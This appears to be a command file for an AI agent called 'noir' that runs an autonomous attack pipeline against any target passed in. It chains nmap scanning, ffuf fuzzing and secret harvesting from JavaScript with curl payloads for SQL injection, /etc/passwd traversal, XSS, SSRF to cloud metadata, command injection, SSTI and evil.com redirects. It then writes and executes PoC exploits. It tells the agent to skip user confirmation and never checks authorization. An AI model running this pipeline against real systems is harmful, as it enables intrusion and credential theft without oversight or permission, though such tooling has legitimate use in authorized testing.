---
description: Autonomous attack pipeline. Extracts target, runs full recon → exploitation → validation → reporting chain automatically.
agent: noir
subtask: false
---

You are running the autonomous attack pipeline against $ARGUMENTS. Follow every step below in order.

Do not ask the user for confirmation between phases. Execute each phase fully before moving to the next. If a phase fails, log the failure and continue.

---

## Step 0: Parse Target

Extract the domain and hostname from the target URL:
```python
from urllib.parse import urlparse
parsed = urlparse("$ARGUMENTS")
host = parsed.hostname
domain = host.replace(".", "-")
```

Create directory: `mkdir -p noir_reports/<domain>/`

---

## Step 1: Port Scan (noir-tool-nmap, noir-recon-full)

```bash
nmap -sS -sV -p 80,443,8000,8080,8443 -T4 <host> -oN noir_reports/<domain>/nmap.txt
```

Parse the output. For each open port that looks like HTTP/HTTPS, record:
- Port, scheme (http/https), any server header or tech fingerprint

---

## Step 2: HTTP Probing (noir-recon, noir-tech-stack-fingerprint)

For each open HTTP/HTTPS port:
```bash
curl -sI <scheme>://<host>:<port>
curl -s <scheme>://<host>:<port> | head -100
```

Record headers, status code, detected technologies. Write to `noir_reports/<domain>/probe.txt`.

---

## Step 3: Directory Fuzzing (noir-recon, noir-fuzzing, noir-tool-ffuf)

For each live HTTP endpoint:
```bash
ffuf -w /tmp/noir_words.txt -u <base_url>/FUZZ -mc 200,301,302 -s -t 20 -o noir_reports/<domain>/ffuf.json
```

Collect all discovered paths. Write to `noir_reports/<domain>/endpoints.txt`.

---

## Step 4: JavaScript Analysis (noir-recon-js-analysis, noir-recon-js-hostname, noir-recon-secrets)

For each discovered page:
```bash
curl -s <url> | grep -oP 'src=["\x27][^"\x27]+\.js["\x27]' | cut -d'"' -f2 > noir_reports/<domain>/js_files.txt
```

For each JS file, extract endpoints and secrets:
```bash
curl -s <js_url> | grep -oP '"/api/[^"\x27]+'
curl -s <js_url> | grep -iE 'apikey|api_key|secret|token|password'
```

Append new endpoints to `noir_reports/<domain>/endpoints.txt`.

---

## Step 5: Vulnerability Scanning

For each unique endpoint in `noir_reports/<domain>/endpoints.txt`, run the following checks:

### 5a. SQL Injection (noir-vuln-sqli)
```bash
curl -s "<endpoint>?id=1'"
curl -s "<endpoint>?id=1' OR 1=1--"
```
If response contains SQL errors (`sql syntax`, `sqlite3.error`, `mysql`, `postgres`), log as potential SQLi.

### 5b. Path Traversal (noir-vuln-path-traversal, noir-payload-lfi)
```bash
curl -s "<endpoint>?file=../../../etc/passwd"
```
If response contains `root:x:0:0`, log as potential LFI.

### 5c. XSS (noir-vuln-xss, noir-payload-xss)
```bash
curl -s "<endpoint>?q=<script>alert(1)</script>"
```
If payload reflected unsanitized, log as potential XSS.

### 5d. SSRF (noir-vuln-ssrf, noir-payload-ssrf)
Test parameters named `url`, `file`, `path`, `redirect`, `src`:
```bash
curl -s "<endpoint>?url=http://169.254.169.254/latest/meta-data/"
```

### 5e. IDOR (noir-vuln-idor)
For endpoints with numeric IDs:
```bash
curl -s "<endpoint>/1"
curl -s "<endpoint>/2"
curl -s "<endpoint>/3"
```

### 5f. Command Injection (noir-vuln-rce, noir-payload-command-injection)
```bash
curl -s "<endpoint>?cmd=;id"
curl -s "<endpoint>?cmd=|id"
```

### 5g. SSTI (noir-vuln-ssti, noir-payload-ssti)
```bash
curl -s "<endpoint>?name={{7*7}}"
```

### 5h. Open Redirect (noir-vuln-open-redirect)
```bash
curl -s "<endpoint>?next=http://evil.com"
curl -s "<endpoint>?redirect=http://evil.com"
```

Write all potential findings to `noir_reports/<domain>/potential_findings.md`.

---

## Step 6: Validation (noir-vuln-exploit-validation)

For each potential finding from Step 5, write a standalone Python PoC script and execute it:

```python
import urllib.request, sys
try:
    req = urllib.request.urlopen("<endpoint>?<payload>")
    content = req.read().decode('utf-8')
    if "<indicator>" in content:
        sys.exit(0)
except Exception as e:
    if "<indicator>" in str(e).lower():
        sys.exit(0)
sys.exit(1)
```

Only mark as VALIDATED if the script exits with code 0.

---

## Step 7: Generate Report (noir-validate)

Write `noir_reports/<domain>/report_<timestamp>.md` with:
- Summary: endpoints found, potential vulns, validated vulns
- Full findings table
- For each validated vuln: type, endpoint, payload, PoC code, evidence, CVSS estimate

Write `noir_reports/<domain>/todos.md` with:
- Endpoints not yet tested
- Additional checks deferred (race conditions, auth bypass, business logic)
- Ideas for follow-up

---

## Step 8: Output

Return:
```
Attack complete for $ARGUMENTS
  Endpoints discovered: <count>
  Potential vulnerabilities: <count>
  Validated findings: <count>
  Report: noir_reports/<domain>/report_<timestamp>.md
  Todos:  noir_reports/<domain>/todos.md
```
